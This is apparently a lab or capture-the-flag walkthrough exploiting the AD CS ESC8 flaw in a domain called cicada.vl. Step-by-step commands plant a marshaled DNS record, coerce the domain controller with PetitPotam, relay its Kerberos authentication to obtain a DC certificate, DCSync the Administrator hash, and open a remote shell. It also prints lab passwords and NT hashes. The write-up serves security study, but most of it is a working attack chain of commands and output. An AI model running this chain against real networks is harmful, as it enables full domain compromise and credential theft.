excerpt: Deep dive into exploiting ADCS ESC8 via Kerberos Relay using KrbRelay to
  obtain domain controller certificates and achieve domain takeover.
---





## Summary

**ESC8** is an AD CS vulnerability where the Certificate Enrollment Web Service is enabled over **HTTP** (without HTTPS). This allows intercepting a Domain Controller's authentication and relaying it to the CA to request a certificate. With that certificate we can impersonate the DC, perform DCSync, and take full control of the domain.

## Requirements

- Valid domain user credentials (`Rosie.Powell:Cicada123`)
- The CA has Web Enrollment over HTTP enabled
- NTLM disabled in the domain (authentication must use Kerberos)
- Machine Account Quota > 0 (allows adding DNS records, default is 10)

## Step-by-step Walkthrough

### 1. Initial Setup

Ensure correct DNS resolution in `/etc/hosts`:

```bash
echo "10.129.28.63 DC-JPQ225.cicada.vl DC-JPQ225 cicada.vl" | sudo tee -a /etc/hosts
```

Obtain a Kerberos TGT (Ticket Granting Ticket) for the user:

```bash
impacket-getTGT cicada.vl/Rosie.Powell:Cicada123 -dc-ip 10.129.28.63
export KRB5CCNAME=Rosie.Powell.ccache
```

### 2. Enumerate AD CS with Certipy

```bash
certipy find -k -u Rosie.Powell@cicada.vl -p Cicada123 -dc-ip 10.129.28.63 -target DC-JPQ225 -vulnerable -stdout
```

Relevant output:

```
CA Name: cicada-DC-JPQ225-CA
Web Enrollment HTTP: Enabled
[!] ESC8: Web Enrollment is enabled over HTTP.
```

### 3. Why add a marshaled DNS record?

When NTLM is disabled, we cannot perform a traditional NTLM relay. We need Kerberos relay, but there is a problem: a Kerberos ticket is encrypted for a specific SPN. If the DC connects to `attacker.cicada.vl`, the KDC issues a ticket for `HOST/attacker.cicada.vl`, which cannot be used to authenticate against AD CS.

**The trick** (discovered by James Forshaw - Project Zero):

A hostname with a special suffix (marshaled target info) is used. When the DC resolves that name via DNS:

1. **DNS** resolves it to our IP (`10.10.16.107`)
2. **Windows SSPI** sees the extra suffix, recognizes it as `CREDENTIAL_TARGET_INFORMATION`, **parses and removes** it
3. The original DC SPN remains (e.g., `cifs/DC-JPQ225.cicada.vl`)
4. The DC requests a ticket **for itself** (its own legitimate SPN)
5. The TCP connection reaches **our machine** (because DNS points to our IP)
6. We receive the DC's ticket and **relay** it to AD CS

The suffix `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` is the DC's serialized SPN.

- [Synacktiv - Relaying Kerberos over SMB using krbrelayx](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)

### 4. Add the marshaled DNS record to AD DNS

```bash
bloodyAD --host DC-JPQ225.cicada.vl -d cicada.vl -u Rosie.Powell -p Cicada123 -k add dnsRecord "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" 10.10.16.107
```

- `--host`: target DC
- `-d`: domain
- `-u/-p`: credentials
- `-k`: use Kerberos (because NTLM is disabled)
- `add dnsRecord`: adds a DNS record in AD
- The label includes a **marshaled suffix** that enables the Kerberos relay

Verify the record resolves correctly:

```bash
dig @10.129.28.63 DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl +short
# Should return: 10.10.16.107
```

**Explanation:** Without the marshaled suffix, the DC would request a ticket for our SPN. With the suffix, Windows interprets it as marshaled target info, extracts it, and the ticket is issued for the DC's original SPN. DNS resolves the entire string to our IP, so the TCP connection arrives at our machine.

### 5. Start the Certipy relay

```bash
sudo certipy relay -target http://DC-JPQ225.cicada.vl -ca cicada-DC-JPQ225-CA -template DomainController
```

- `-target`: HTTP endpoint of the CA (Web Enrollment)
- `-ca`: Certificate Authority name
- `-template DomainController`: template used to request the certificate

Note: `sudo` is required because it binds to port **445** (SMB).

Expected output:

```
[*] Targeting http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

If port 445 is occupied (by Samba, Responder, or another relay tool):

```bash
sudo ss -ltnp | grep ':445'
sudo systemctl stop smbd nmbd
```

### 6. Coerce the DC's authentication

In **another terminal**, while keeping the relay running:

```bash
nxc smb DC-JPQ225.cicada.vl -k -u rosie.powell -p Cicada123 -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

- `-M coerce_plus`: NetExec module that forces authentication
- `LISTENER`: our marshaled DNS record
- `METHOD=PetitPotam`: uses the EfsRpc vulnerability (PetitPotam)

**What happens internally?**

1. NetExec uses Kerberos to authenticate to the DC
2. Sends an RPC request to `EfsRpcAddUsersToFile` (PetitPotam)
3. The DC attempts to authenticate against the listener (our machine) via a UNC path
4. DNS resolves the listener to our IP
5. The SMB connection (on port 445) reaches the certipy relay
6. Certipy receives the authentication and **relays** it to the CA's HTTP endpoint
7. The CA issues a certificate using the `DomainController` template

Expected output in the relay:

```
[*] Targeting http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.28.63, attacking target http://DC-JPQ225.cicada.vl

[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"

[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
```

### 7. Authenticate with the obtained certificate

```bash
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.28.63
```

This extracts from the PFX:
- **TGT** for the DC machine account (`dc-jpq225$`)
- **NT hash** of the DC machine account

Output:

```
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404ee...a65952c664e9cf5de60195626edbeee3
```

### 8. DCSync — Extract the Administrator hash

```bash
export KRB5CCNAME=dc-jpq225.ccache
klist  # Verify the principal is dc-jpq225$@CICADA.VL

impacket-secretsdump -k -no-pass cicada.vl/dc-jpq225\$@DC-JPQ225.cicada.vl -just-dc-user Administrator
```

- `-k`: use Kerberos
- `-no-pass`: no password required (uses the ccache)
- `\$`: escapes the `$` in the shell
- `-just-dc-user Administrator`: extracts only the Administrator's hash

**What is DCSync?** It is an attack that abuses the DRSUAPI (Directory Replication Service) protocol. Normally DCs use it to replicate data between each other. An attacker with replication permissions (as the DC machine account has) can ask the DC to replicate the hashes of any user, including the Administrator.

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

### 9. Connect as Administrator

Since NTLM authentication is disabled, we need to request a fresh TGT for the Administrator:

```bash
impacket-getTGT cicada.vl/Administrator -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.28.63
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-psexec cicada.vl/Administrator@DC-JPQ225.cicada.vl -k -dc-ip 10.129.28.63 -hashes :85a0da53871a9d56b6cd05deda3a5e87
```

Or via WinRM:

```bash
evil-winrm -r CICADA.VL -u administrator -i dc-jpq225.cicada.vl
```
